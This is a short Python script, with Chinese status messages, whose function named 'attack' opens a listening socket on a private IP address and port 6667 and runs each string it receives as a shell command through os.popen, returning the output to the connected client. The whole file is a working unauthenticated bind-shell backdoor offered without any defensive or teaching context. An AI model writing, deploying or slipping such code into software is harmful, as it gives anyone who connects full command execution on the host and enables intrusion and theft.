import socket
import os


def attack():
    try:
        s = socket.socket()
        s.bind(('192.168.1.6', 6667))
        s.listen()
        chanel, client = s.accept()


    except:
        print('客户端连接失败')
        s.close()
        attack()
    else:
        while True:
            receive = chanel.recv(1024).decode()
            if receive == 'exit':
                break
            reply = os.popen(receive).read()
            chanel.send(f"命令{receive}的结果是{reply}".encode('utf-8'))


if __name__ == '__main__':
    attack()
